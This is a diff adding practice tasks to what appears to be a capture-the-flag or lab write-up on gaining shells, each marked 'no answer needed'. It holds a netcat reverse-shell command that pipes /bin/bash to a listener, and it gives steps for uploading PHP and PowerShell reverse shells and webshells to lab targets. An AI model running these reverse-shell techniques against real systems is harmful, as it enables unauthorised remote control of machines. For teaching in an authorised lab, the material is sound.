@@ -86,3 +86,26 @@
 - Try uploading a webshell to the Linux box, then use the command: nc <LOCAL-IP> <PORT> -e /bin/bash to send a reverse shell back to a waiting listener on your own machine.
 
 	  no answer needed
+- Navigate to /usr/share/webshells/php/php-reverse-shell.php in Kali and change the IP and port to match your tun0 IP with a custom port. Set up a netcat listener, then upload and activate the shell.
+
+	  no answer needed
+
+- Log into the Linux machine over SSH using the credentials in task 14. Use the techniques in Task 8 to experiment with bind and reverse netcat shells.
+
+	  no answer needed
+
+- Practice reverse and bind shells using Socat on the Linux machine. Try both the normal and special techniques.
+
+	  no answer needed
+
+- Look through Payloads all the Things and try some of the other reverse shell techniques. Try to analyse them and see why they work.
+
+	  no answer needed
+
+- Switch to the Windows VM. Try uploading and activating the php-reverse-shell. Does this work?
+
+	  no answer needed
+
+- Upload a webshell on the Windows target and try to obtain a reverse shell using Powershell.
+
+	  no answer needed
